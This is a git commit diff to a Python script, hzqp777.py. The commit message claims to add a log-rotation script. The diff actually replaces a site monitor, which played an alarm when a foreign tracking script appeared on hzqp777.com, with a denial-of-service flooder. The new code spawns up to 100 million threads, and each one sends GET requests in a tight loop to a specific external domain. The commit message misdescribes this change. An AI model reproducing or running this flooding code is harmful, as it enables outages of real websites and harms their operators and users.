dfc8ef427a8f4f21382094198f996e217adcbde3
3245554@qq.com <3245554@qq.com>
2019-04-13 18:51:41 +0800

    添加日子切割脚本

--- python-py/hzqp777.py
+++ python-py/hzqp777.py
@@ -1,30 +1,36 @@
 #!/usr/bin/python3
 # _*_coding:utf8_*_
 
-import urllib3,time,pygame
+import urllib3,time,pygame,_thread
 
+def reques_url(number):
+    while True:
+        try:
+            number = urllib3.PoolManager()
+            print("run start%s"%number)
+            os_obj=number.request('GET',"https://66660162.kutoucf.com/",timeout=10.0)
+            #data=os_obj._body.decode()
+            #print(data)
+            # if "https://js.users.51.la/19834087.js" in data:
+            #     file="/home/devops/data/bash-shell/python-py/5051.wav"
+            #     pygame.mixer.init()
+            #     track = pygame.mixer.music.load(file)
+            #     pygame.mixer.music.play()
+            #     time.sleep(3)
+            #     pygame.mixer.music.stop()
+            #     print ("被攻击了")
+            # else:
+            #     print("0")
+        except Exception as e:
+            # errorfile="/home/devops/data/bash-shell/python-py/5051.wav"
+            # pygame.mixer.init()
+            # trackf = pygame.mixer.music.load(errorfile)
+            # pygame.mixer.music.play()
+            # time.sleep(1)
+            # pygame.mixer.music.stop()
+            print("程序出错了%s"%e)
 
-while True:
-    req=urllib3.PoolManager()
-    time.sleep(3)
-    try:
-        os_obj=req.request('GET',"http://www.hzqp777.com",timeout=10.0)
-        data=os_obj._body.decode()
-        if "https://js.users.51.la/19834087.js" in data:
-            file="/home/devops/data/bash-shell/python-py/5051.wav"
-            pygame.mixer.init()
-            track = pygame.mixer.music.load(file)
-            pygame.mixer.music.play()
-            time.sleep(3)
-            pygame.mixer.music.stop()
-            print ("被攻击了")
-        else:
-            print("0")
-    except Exception as e:
-        errorfile="/home/devops/data/bash-shell/python-py/5051.wav"
-        pygame.mixer.init()
-        trackf = pygame.mixer.music.load(errorfile)
-        pygame.mixer.music.play()
-        time.sleep(1)
-        pygame.mixer.music.stop()
-        print("程序出错了%s"%e)
+if __name__ == "__main__":
+    number=100000000
+    for i in range(number):
+        thread=_thread.start_new_thread(reques_url,('thread%d'%i,))
